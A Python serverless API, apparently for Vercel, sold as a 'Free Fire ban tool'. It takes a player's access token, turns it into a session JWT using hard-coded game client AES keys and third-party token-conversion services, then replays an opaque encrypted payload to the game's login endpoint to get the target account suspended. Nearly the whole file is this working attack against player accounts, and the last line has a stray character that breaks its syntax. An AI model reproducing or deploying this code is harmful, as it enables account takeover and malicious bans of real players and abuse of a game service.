# ====================== API VERCEL - FREE FIRE BAN TOOL ======================
# Deploy lên Vercel như một serverless API
# File: api/ban.py

import json
import base64
import requests
import urllib3
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

urllib3.disable_warnings()

# ====================== CONSTANTS ======================
API_URL = 'https://clientbp.ggpolarbear.com/GetLoginData'
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'
mLuRl  = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB53"
}

# ====================== PROTOBUF ======================
class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str):
            value = value.encode('utf-8')
        res = bytearray()
        res.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        res.extend(SimpleProtobuf.encode_varint(len(value)))
        res.extend(value)
        return bytes(res)

    @staticmethod
    def create_login_payload(open_id, access_token, platform):
        payload = bytearray()
        curr = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload.extend(SimpleProtobuf.encode_string(3, curr))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, platform))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_string(99, platform))
        return bytes(payload)

# ====================== CRYPTO ======================
def enc(d):
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d):
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def decode_ff_name(b64_str):
    try:
        if not b64_str:
            return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        return decrypted_bytes.decode('utf-8', errors='ignore') or "Unknown"
    except Exception:
        return "Unknown"

# ====================== JWT DECODE ======================
def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        return json.loads(decoded_bytes.decode('utf-8'))
    except Exception:
        return {}

# ====================== CONVERT TOKEN TO JWT ======================
def convert_token_to_jwt(access_token):
    """Gọi API https://jwt-caidb.vercel.app/convert/<token> để lấy JWT"""
    try:
        url = f"https://jwt-caidb.vercel.app/convert/{access_token}"
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('success') and data.get('jwt_token'):
                return data['jwt_token'], data.get('decoded', {})
        return None, None
    except Exception as e:
        return None, None

# ====================== MAJOR LOGIN ======================
def build_majorlogin(tok, open_id, p_type):
    return enc(SimpleProtobuf.create_login_payload(open_id, tok, str(p_type)))

def fetch_majorlogin_jwt(token):
    """Lấy JWT token từ MajorLogin hoặc từ API convert"""
    # Nếu đã là JWT thì dùng luôn
    if token.startswith("ey") and "." in token:
        return token, decode_jwt(token), None

    # Thử convert token -> JWT qua API
    jwt_token, decoded = convert_token_to_jwt(token)
    if jwt_token:
        return jwt_token, decoded, None

    # Fallback: extract open_id từ token
    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={token}", 
                         headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
        oId = r.json().get("open_id")
    except:
        pass

    if not oId:
        try:
            uid_headers = {"access-token": token, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", 
                                   headers=uid_headers, verify=False, timeout=5).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login",
                                           headers={"Content-Type": "application/json"},
                                           json={"app_id": 100067, "login_id": str(uid)},
                                           verify=False, timeout=5).json()
                oId = openid_res.get("open_id")
        except:
            pass

    if not oId:
        return None, None, "Failed to extract Open ID"

    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(token, oId, p_type)
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
            if x.status_code == 200:
                try:
                    decrypted = dec(x.content)
                    parsed = get_available_room(decrypted.hex())
                    for key, value in parsed.items():
                        if isinstance(value.get('data'), str) and len(value.get('data', '')) > 50 and '.' in value.get('data', ''):
                            jwt_candidate = value.get('data')
                            return jwt_candidate, decode_jwt(jwt_candidate), None
                except:
                    parsed = get_available_room(x.content.hex())
                    for key, value in parsed.items():
                        if isinstance(value.get('data'), str) and len(value.get('data', '')) > 50 and '.' in value.get('data', ''):
                            return value.get('data'), decode_jwt(value.get('data')), None
        except Exception:
            continue

    return None, None, "MajorLogin failed"

def get_available_room(hex_data):
    try:
        data = bytes.fromhex(hex_data)
        result = {}
        index = 0
        while index < len(data):
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            if wire_type == 0:
                val = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    val |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                result[str(field_num)] = {"data": val}
            elif wire_type == 2:
                length = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    length |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                val_bytes = data[index:index + length]
                index += length
                try:
                    result[str(field_num)] = {"data": val_bytes.decode('utf-8')}
                except:
                    result[str(field_num)] = {"data": val_bytes.hex()}
            else:
                break
        return result
    except:
        return {}

# ====================== TRIGGER BAN ======================
def trigger_ban(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)

# ====================== API HANDLER (VERCEL) ======================
def handler(request, context):
    """
    Vercel serverless function handler
    GET /api/ban?token=<access_token_or_jwt>
    """
    # Lấy token từ query params
    token = request.query.get('token') or request.query.get('access_token')
    
    if not token:
        return {
            'statusCode': 400,
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps({
                'success': False,
                'error': 'Missing token parameter',
                'usage': 'GET /api/ban?token=<your_token_or_jwt>'
            }, ensure_ascii=False)
        }
    
    try:
        # Bước 1: Lấy JWT và thông tin người chơi
        jwt_token, decoded, error = fetch_majorlogin_jwt(token)
        
        if not jwt_token:
            return {
                'statusCode': 401,
                'headers': {'Content-Type': 'application/json'},
                'body': json.dumps({
                    'success': False,
                    'error': error or 'Failed to authenticate token',
                    'token_provided': token[:20] + '...' if len(token) > 20 else token
                }, ensure_ascii=False)
            }
        
        # Giải mã nickname
        raw_nick = decoded.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        account_id = decoded.get('account_id', 'Unknown')
        region = decoded.get('lock_region', decoded.get('region', 'Unknown'))
        version = decoded.get('release_version', 'OB53')
        
        # Bước 2: Gửi payload ban
        ban_response = trigger_ban(jwt_token, version)
        
        if ban_response.status_code == 200:
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'application/json'},
                'body': json.dumps({
                    'success': True,
                    'message': 'Account banned successfully',
                    'target': {
                        'nickname': nickname,
                        'account_id': account_id,
                        'region': region,
                        'version': version
                    },
                    'status': 'SUSPENDED',
                    'timestamp': datetime.now().isoformat()
                }, ensure_ascii=False, indent=2)
            }
        else:
            return {
                'statusCode': ban_response.status_code,
                'headers': {'Content-Type': 'application/json'},
                'body': json.dumps({
                    'success': False,
                    'error': f'Ban payload failed with status {ban_response.status_code}',
                    'target': {
                        'nickname': nickname,
                        'account_id': account_id,
                        'region': region
                    }
                }, ensure_ascii=False)
            }
            
    except Exception as e:
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'application/json'},
            'body': json.dumps({
                'success': False,
                'error': str(e)
            }, ensure_ascii=False)
        }


# ====================== FOR LOCAL TESTING ======================
if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        token = sys.argv[1]
        result = handler({'query': {'token': token}}, None)
        print(json.dumps(json.loads(result['body']), indent=2, ensure_ascii=False))
    else:
        print("Usage: python ban.py <access_token_or_jwt>")x
